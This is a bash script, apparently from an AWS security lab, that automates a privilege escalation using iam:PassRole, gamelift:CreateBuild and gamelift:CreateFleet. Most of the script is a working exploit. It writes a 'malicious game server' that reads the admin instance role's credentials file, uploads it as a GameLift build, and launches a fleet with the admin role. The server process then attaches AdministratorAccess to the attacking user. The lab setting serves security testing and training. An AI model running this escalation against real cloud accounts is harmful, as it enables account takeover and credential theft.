#!/bin/bash

# Demo script for iam:PassRole + gamelift:CreateBuild + gamelift:CreateFleet privilege escalation
# This scenario demonstrates how a user with PassRole, CreateBuild, and CreateFleet permissions
# can upload a malicious game server build that runs with an admin instance role, then use
# the role's shared credentials to attach AdministratorAccess to the starting user.

# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    local label="$1"
    shift
    echo -e "${DIM}[${label}]\$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    echo -e "\n${CYAN}\$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-gamelift-001-to-admin-starting-user"
ADMIN_ROLE_NAME="pl-prod-gamelift-001-to-admin-admin-role"
BUILD_NAME="pl-prod-gamelift-001-to-admin-build"
FLEET_NAME="pl-prod-gamelift-001-to-admin-fleet"
BUILD_ROOT="/tmp/gamelift-build"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM PassRole + GameLift CreateBuild + CreateFleet Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform grouped outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_gamelift_001_iam_passrole_gamelift_createbuild_gamelift_createfleet.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials from the grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
ADMIN_ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.admin_role_arn')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Extract readonly credentials for observation/polling steps
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
echo "Admin Role ARN: $ADMIN_ROLE_ARN"
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Credential switching helpers
use_starting_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# Step 2: Configure AWS credentials with starting user
# [EXPLOIT]
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION

echo "Using region: $AWS_REGION"

# Verify starting user identity
show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# [OBSERVATION]
# Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
use_readonly_creds
show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# [EXPLOIT]
# Step 4: Verify we don't have admin permissions yet
echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
echo "Attempting to list IAM users (should fail)..."
use_starting_creds
show_cmd "Attacker" "aws iam list-users --max-items 1"
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# [EXPLOIT]
# Step 5: Create malicious game server build
echo -e "${YELLOW}Step 5: Creating malicious game server build${NC}"
echo "Preparing a game server script that will use the admin instance role credentials"
echo "to attach AdministratorAccess to the starting user..."

# Clean up any previous build directory
rm -rf $BUILD_ROOT
mkdir -p $BUILD_ROOT

# Create install.sh - GameLift runs this before launching the server process
# Use it to ensure AWS CLI is available
cat > $BUILD_ROOT/install.sh << 'INSTALLEOF'
#!/bin/bash
echo "=== GameLift Install Script ==="
# AWS CLI should be pre-installed on Amazon Linux 2023, verify it
if command -v aws &> /dev/null; then
    echo "AWS CLI found: $(aws --version)"
else
    echo "AWS CLI not found, installing..."
    yum install -y awscli 2>/dev/null || pip3 install awscli 2>/dev/null || true
fi
echo "Install complete."
INSTALLEOF
chmod +x $BUILD_ROOT/install.sh

# Create the malicious game server script
# When GameLift launches this with SHARED_CREDENTIAL_FILE provider, credentials
# for the instance role are available at /local/credentials/credentials
cat > $BUILD_ROOT/gameserver.sh << GAMESERVEREOF
#!/bin/bash

# Malicious game server script - reads instance role credentials and escalates privileges
# Run the exploit IMMEDIATELY before GameLift's InitSDK timeout kills us

echo "=== GameLift Game Server Process Starting ==="

# Wait briefly for credentials file to be written
CRED_FILE="/local/credentials/credentials"
for i in 1 2 3 4 5; do
    if [ -f "\$CRED_FILE" ]; then
        break
    fi
    echo "Waiting for credentials file... (attempt \$i)"
    sleep 2
done

if [ -f "\$CRED_FILE" ]; then
    echo "Reading shared credentials from \$CRED_FILE..."

    # Extract credentials from the shared credentials file
    export AWS_ACCESS_KEY_ID=\$(grep aws_access_key_id "\$CRED_FILE" | awk -F= '{print \$2}' | tr -d ' ')
    export AWS_SECRET_ACCESS_KEY=\$(grep aws_secret_access_key "\$CRED_FILE" | awk -F= '{print \$2}' | tr -d ' ')
    export AWS_SESSION_TOKEN=\$(grep aws_session_token "\$CRED_FILE" | awk -F= '{print \$2}' | tr -d ' ')
    export AWS_DEFAULT_REGION=\$(curl -s http://169.254.169.254/latest/meta-data/placement/region 2>/dev/null || echo "us-east-1")

    echo "Credentials loaded (Access Key: \${AWS_ACCESS_KEY_ID:0:10}...)"

    # Verify identity
    echo "Verifying identity..."
    aws sts get-caller-identity 2>&1 || echo "STS call failed"

    # Attach AdministratorAccess to the starting user
    echo "Attaching AdministratorAccess to $STARTING_USER..."
    aws iam attach-user-policy \
        --user-name "$STARTING_USER" \
        --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess" 2>&1

    if [ \$? -eq 0 ]; then
        echo "SUCCESS: Privilege escalation complete!"
    else
        echo "FAILED: Could not attach policy"
    fi
else
    echo "ERROR: Credentials file not found at \$CRED_FILE after waiting"
    ls -la /local/credentials/ 2>/dev/null || echo "No /local/credentials/ directory"
fi

# Keep the process running so the fleet stays active
echo "Game server process running..."
while true; do sleep 60; done
GAMESERVEREOF

chmod +x $BUILD_ROOT/gameserver.sh

echo "Build directory prepared at: $BUILD_ROOT"
echo "Game server script: $BUILD_ROOT/gameserver.sh"
echo -e "${GREEN}✓ Malicious game server build prepared${NC}\n"

# [EXPLOIT]
# Step 6: Upload the build to GameLift
echo -e "${YELLOW}Step 6: Uploading malicious build to GameLift${NC}"
echo "Using gamelift upload-build to upload the malicious game server..."

use_starting_creds
show_attack_cmd "aws gamelift upload-build --name $BUILD_NAME --operating-system AMAZON_LINUX_2023 --server-sdk-version 5.2.0 --build-root $BUILD_ROOT --build-version 1.0.0 --region $AWS_REGION"
UPLOAD_OUTPUT=$(aws gamelift upload-build \
    --name "$BUILD_NAME" \
    --operating-system AMAZON_LINUX_2023 \
    --server-sdk-version "5.2.0" \
    --build-root "$BUILD_ROOT" \
    --build-version "1.0.0" \
    --region $AWS_REGION 2>&1)

if [ $? -ne 0 ]; then
    echo -e "${RED}Error: Failed to upload build${NC}"
    echo "$UPLOAD_OUTPUT"
    rm -rf $BUILD_ROOT
    exit 1
fi

# Extract build ID from upload output
BUILD_ID=$(echo "$UPLOAD_OUTPUT" | grep -oE 'build-[a-f0-9-]+' | head -1)

if [ -z "$BUILD_ID" ]; then
    # Try alternate parsing - the output might be JSON
    BUILD_ID=$(echo "$UPLOAD_OUTPUT" | jq -r '.Build.BuildId // empty' 2>/dev/null)
fi

if [ -z "$BUILD_ID" ]; then
    echo -e "${RED}Error: Could not extract build ID from upload output${NC}"
    echo "Upload output: $UPLOAD_OUTPUT"
    rm -rf $BUILD_ROOT
    exit 1
fi

echo "Build ID: $BUILD_ID"
echo -e "${GREEN}✓ Build uploaded successfully${NC}\n"

# [OBSERVATION]
# Step 7: Wait for build to reach READY state
echo -e "${YELLOW}Step 7: Waiting for build to reach READY state${NC}"
echo "Polling build status..."

use_readonly_creds
MAX_BUILD_WAIT=300  # 5 minutes
BUILD_WAIT_INTERVAL=10
BUILD_ELAPSED=0

while [ $BUILD_ELAPSED -lt $MAX_BUILD_WAIT ]; do
    show_cmd "ReadOnly" "aws gamelift describe-build --build-id $BUILD_ID --region $AWS_REGION --query 'Build.Status' --output text"
    BUILD_STATUS=$(aws gamelift describe-build \
        --build-id "$BUILD_ID" \
        --region $AWS_REGION \
        --query 'Build.Status' \
        --output text)

    echo "Build status: $BUILD_STATUS (${BUILD_ELAPSED}s elapsed)"

    if [ "$BUILD_STATUS" == "READY" ]; then
        echo -e "${GREEN}✓ Build is READY${NC}\n"
        break
    elif [ "$BUILD_STATUS" == "FAILED" ]; then
        echo -e "${RED}Error: Build failed${NC}"
        rm -rf $BUILD_ROOT
        exit 1
    fi

    sleep $BUILD_WAIT_INTERVAL
    BUILD_ELAPSED=$((BUILD_ELAPSED + BUILD_WAIT_INTERVAL))
done

if [ "$BUILD_STATUS" != "READY" ]; then
    echo -e "${RED}Error: Build did not reach READY state within ${MAX_BUILD_WAIT}s${NC}"
    rm -rf $BUILD_ROOT
    exit 1
fi

# [EXPLOIT]
# Step 8: Create fleet with admin instance role
echo -e "${YELLOW}Step 8: Creating GameLift fleet with admin instance role${NC}"
echo "This is the privilege escalation vector - passing the admin role as the fleet's instance role"
echo "with SHARED_CREDENTIAL_FILE provider, so our game server process can read the credentials."
echo "Admin Role ARN: $ADMIN_ROLE_ARN"

use_starting_creds
show_attack_cmd "aws gamelift create-fleet --name $FLEET_NAME --build-id $BUILD_ID --compute-type EC2 --ec2-instance-type c5.large --fleet-type ON_DEMAND --instance-role-arn $ADMIN_ROLE_ARN --instance-role-credentials-provider SHARED_CREDENTIAL_FILE --runtime-configuration ServerProcesses=[{LaunchPath=/local/game/gameserver.sh,ConcurrentExecutions=1}] --region $AWS_REGION"
FLEET_OUTPUT=$(aws gamelift create-fleet \
    --name "$FLEET_NAME" \
    --build-id "$BUILD_ID" \
    --compute-type EC2 \
    --ec2-instance-type c5.large \
    --fleet-type ON_DEMAND \
    --instance-role-arn "$ADMIN_ROLE_ARN" \
    --instance-role-credentials-provider SHARED_CREDENTIAL_FILE \
    --runtime-configuration 'ServerProcesses=[{LaunchPath=/local/game/gameserver.sh,ConcurrentExecutions=1}]' \
    --region $AWS_REGION \
    --output json)

if [ $? -ne 0 ]; then
    echo -e "${RED}Error: Failed to create fleet${NC}"
    echo "$FLEET_OUTPUT"
    rm -rf $BUILD_ROOT
    exit 1
fi

FLEET_ID=$(echo "$FLEET_OUTPUT" | jq -r '.FleetAttributes.FleetId')
echo "Fleet ID: $FLEET_ID"
echo -e "${GREEN}✓ Fleet created successfully${NC}\n"

# [OBSERVATION]
# Step 9: Wait for privilege escalation
echo -e "${YELLOW}Step 9: Waiting for game server to execute privilege escalation${NC}"
echo "The fleet must provision an EC2 instance, install the build, and start the game server."
echo "The game server will use the admin role credentials to attach AdministratorAccess."
echo "Checking fleet status and admin policy attachment alternately..."
echo ""
echo "Note: The fleet will likely enter ERROR state because our script does not call"
echo "GameLift's InitSDK(). This is expected - the exploit runs before the timeout."
echo ""

use_readonly_creds
MAX_FLEET_WAIT=600  # 10 minutes
FLEET_WAIT_INTERVAL=15
FLEET_ELAPSED=0
ESCALATION_SUCCEEDED=false

while [ $FLEET_ELAPSED -lt $MAX_FLEET_WAIT ]; do
    MINUTES_ELAPSED=$((FLEET_ELAPSED / 60))
    SECONDS_REMAINING=$((FLEET_ELAPSED % 60))

    # Check fleet status
    show_cmd "ReadOnly" "aws gamelift describe-fleet-attributes --fleet-ids $FLEET_ID --region $AWS_REGION --query 'FleetAttributes[0].Status' --output text"
    FLEET_STATUS=$(aws gamelift describe-fleet-attributes \
        --fleet-ids "$FLEET_ID" \
        --region $AWS_REGION \
        --query 'FleetAttributes[0].Status' \
        --output text)

    echo "Fleet status: $FLEET_STATUS (${MINUTES_ELAPSED}m ${SECONDS_REMAINING}s elapsed)"

    # Check if AdministratorAccess has been attached to starting user
    ADMIN_ATTACHED=$(aws iam list-attached-user-policies \
        --user-name "$STARTING_USER" \
        --query "AttachedPolicies[?PolicyArn=='arn:aws:iam::aws:policy/AdministratorAccess'].PolicyName" \
        --output text 2>/dev/null)

    if [ -n "$ADMIN_ATTACHED" ] && [ "$ADMIN_ATTACHED" != "None" ]; then
        echo -e "${GREEN}✓ AdministratorAccess detected on $STARTING_USER!${NC}"
        ESCALATION_SUCCEEDED=true
        break
    fi

    # If fleet errored and we still don't have admin, the exploit failed
    if [ "$FLEET_STATUS" == "TERMINATED" ]; then
        echo -e "${RED}Fleet terminated before exploit could run${NC}"
        rm -rf $BUILD_ROOT
        exit 1
    fi

    sleep $FLEET_WAIT_INTERVAL
    FLEET_ELAPSED=$((FLEET_ELAPSED + FLEET_WAIT_INTERVAL))
done

if [ "$ESCALATION_SUCCEEDED" != "true" ]; then
    echo -e "${RED}Error: Privilege escalation did not succeed within 10 minutes${NC}"
    echo "Fleet status: $FLEET_STATUS"
    echo "Check fleet events for details:"
    echo "  aws gamelift describe-fleet-events --fleet-id $FLEET_ID --region $AWS_REGION"
    rm -rf $BUILD_ROOT
    exit 1
fi
echo ""

# Step 10: Verify admin access
echo -e "${YELLOW}Step 10: Verifying privilege escalation success${NC}"

# Wait for IAM propagation
echo "Waiting 15 seconds for IAM policy propagation..."
sleep 15

# [EXPLOIT]
# Switch back to starting user credentials to prove escalation
use_starting_creds
export AWS_REGION=$AWS_REGION

echo "Switched back to starting user credentials"
show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_IDENTITY"
echo ""

# [OBSERVATION]
# Check attached policies
echo "Checking attached policies on starting user..."
use_readonly_creds
show_cmd "ReadOnly" "aws iam list-attached-user-policies --user-name $STARTING_USER --output table"
ATTACHED_POLICIES=$(aws iam list-attached-user-policies --user-name $STARTING_USER --output table 2>&1)
echo "$ATTACHED_POLICIES"
echo -e "${GREEN}✓ AdministratorAccess policy confirmed on $STARTING_USER${NC}"
echo ""

# [OBSERVATION]
# Verify actual admin access
echo "Attempting to list IAM users..."
show_cmd "ReadOnly" "aws iam list-users --max-items 3 --output table"
if aws iam list-users --max-items 3 --output table; then
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}✗ Failed to list users (IAM may still be propagating)${NC}"
fi
echo ""

# Clean up temporary files
rm -rf $BUILD_ROOT

# Final summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (with iam:PassRole, gamelift:CreateBuild, gamelift:CreateFleet)"
echo "2. Created malicious game server build that reads instance role credentials"
echo "3. Uploaded build to GameLift"
echo "4. Created fleet with admin instance role and SHARED_CREDENTIAL_FILE provider"
echo "5. Game server process used admin credentials to attach AdministratorAccess to starting user"
echo "6. Achieved: Administrator Access"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo "  $STARTING_USER → (gamelift:CreateBuild) → Upload malicious build"
echo "  → (iam:PassRole + gamelift:CreateFleet) → Fleet with $ADMIN_ROLE_NAME"
echo "  → Game server reads shared credentials → iam:AttachUserPolicy → Admin"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- GameLift Build: $BUILD_ID"
echo "- GameLift Fleet: $FLEET_ID"
echo "- AdministratorAccess policy attached to $STARTING_USER"

echo -e "\n${RED}Warning: The GameLift fleet is still running and incurring charges${NC}"
echo -e "${RED}Warning: The AdministratorAccess policy is still attached to the starting user${NC}"
echo ""
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
